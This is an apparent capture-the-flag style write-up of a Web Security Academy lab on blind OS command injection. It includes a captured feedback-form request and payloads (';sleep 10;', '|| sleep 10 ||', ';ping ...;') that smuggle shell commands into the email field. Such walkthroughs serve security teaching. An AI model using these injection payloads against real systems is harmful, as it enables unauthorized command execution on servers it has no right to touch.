# 2. Blind OS command injection with time delays

**Goal** : time delay in response of submit function.

**Steps** : 

- submit the feedback form, u will get an endpoint of /feedback/submit

```jsx
POST /feedback/submit HTTP/2
Host: 0a72005b035f051d86c96c8100f800b3.web-security-academy.net
Cookie: session=nNVT2lj3UzBnMBTthLm537QzPiqGukdB
Content-Length: 116
Sec-Ch-Ua-Platform: "Linux"
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Sec-Ch-Ua: "Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"
Content-Type: application/x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Origin: https://0a72005b035f051d86c96c8100f800b3.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a72005b035f051d86c96c8100f800b3.web-security-academy.net/feedback
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Priority: u=1, i

csrf=YXal0CSYpfHO8GZDQEVxZ4F9DCSdAdYf&name=hacker&email=hack%40gmail.com&subject=Super&message=Now+we+are+in+bro
```

- send this in repeater, and check every parameter by input **;ls;**
- u can see only email parameter giving some unique response(res : could not save….)
- now add **;sleep 10;**  to check for delay in response.

```jsx
email=hack%40gmail.com;sleep 10; 
```

— > full payload like this : 

```jsx
csrf=YXal0CSYpfHO8GZDQEVxZ4F9DCSdAdYf&name=hacker&email=hack%40gmail.com;sleep 10;&subject=Super&message=Now+we+are+in+bro
```

- send the request u can see 10 second delay in respose.

LAB SOLVED.

### You can also use this payload :

```jsx
|| sleep 10 || 
;ping -c 127.0.0.1; 
```